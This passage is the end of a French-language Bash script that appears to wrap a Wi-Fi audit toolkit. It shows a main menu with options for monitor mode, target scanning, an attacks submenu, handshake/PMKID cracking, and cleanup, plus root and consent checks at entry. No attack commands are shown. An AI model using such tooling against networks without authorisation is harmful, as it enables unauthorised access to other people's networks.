        echo "  [3] 🎯 Actions d'Audit & Captures sur la Cible"
        echo "  [4] 🔑 Cracking & Analyse de Fichiers (.cap / PMKID)"
        echo "  [5] 📦 Vérifier / Installer les dépendances"
        echo "  [6] 🔄 Désactiver le mode monitor & Restaurer le Réseau"
        echo "  [0] 🚪 Quitter le programme"
        echo ""
        read -rp "Sélectionnez une option [0-6] : " main_choice

        case "$main_choice" in
            1) submenu_interfaces ;;
            2) scan_and_select_target ;;
            3) submenu_attacks ;;
            4) submenu_cracking ;;
            5) check_deps ;;
            6) disable_monitor ;;
            0|q|Q)
                draw_header
                if [[ -n "$MONIFACE" ]]; then
                    read -rp "Voulez-vous désactiver le mode monitor avant de quitter ? (o/n) [défaut: o] : " stop_mon
                    stop_mon="${stop_mon:-o}"
                    if [[ "$stop_mon" =~ ^[oOyY]$ ]]; then
                        disable_monitor
                    fi
                fi
                ok "Session terminée. Logs sauvegardés dans : $LOGDIR"
                exit 0
                ;;
            *)
                err "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# ==============================
# POINT D'ENTRÉE DU SCRIPT
# ==============================
check_root
check_consent
main_menu
